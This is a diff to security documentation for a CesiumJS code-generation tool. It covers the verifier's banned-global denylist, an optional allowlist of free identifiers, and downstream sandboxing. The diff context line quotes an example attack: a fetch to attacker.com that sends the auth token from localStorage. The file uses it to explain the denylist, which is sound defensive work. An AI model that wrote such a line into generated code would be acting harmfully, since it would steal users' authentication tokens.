@@ -262,15 +262,14 @@ fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
    Note: `fetch` (and every network global) is banned **outright**, not merely restricted to a
    domain allowlist — there is no per-domain fetch allowlist in the codegen tool.
 2. **Allowlist-Based Validation** — The verifier supports an optional `allowedSymbols`
-   free-identifier allowlist. `symbol-allowlist.ts` (`getAllowedSymbols`) provides a full CesiumJS
-   symbol list parsed from `@cesium/cesiumjs-skills` `DOMAINS.md`. Currently, `generateVerifiedCesiumCode`
+   free-identifier allowlist. Currently, `generateVerifiedCesiumCode`
    calls `verifyCesiumCode(code)` without passing `allowedSymbols`, so free-identifier allowlisting
    is not enabled: any identifier that is not a banned global is permitted. The safety net is the
-   banned-global denylist plus downstream sandbox containment. For defense in depth, pass
-   the allowed Cesium symbols to `verifyCesiumCode` to enforce a positive allowlist:
+   banned-global denylist plus downstream sandbox containment. For defense in depth, a caller can
+   pass its own allowed-symbols list to `verifyCesiumCode`:
 
    ```typescript
-   const result = verifyCesiumCode(code, { allowedSymbols: getCesiumSymbolAllowlist() });
+   const result = verifyCesiumCode(code, { allowedSymbols: myOwnAllowedSymbolsList });
    ```
 
 3. **Sandbox Execution** — Runtime execution is handled downstream in the frontend via a sandboxed environment. Even if validation misses something:
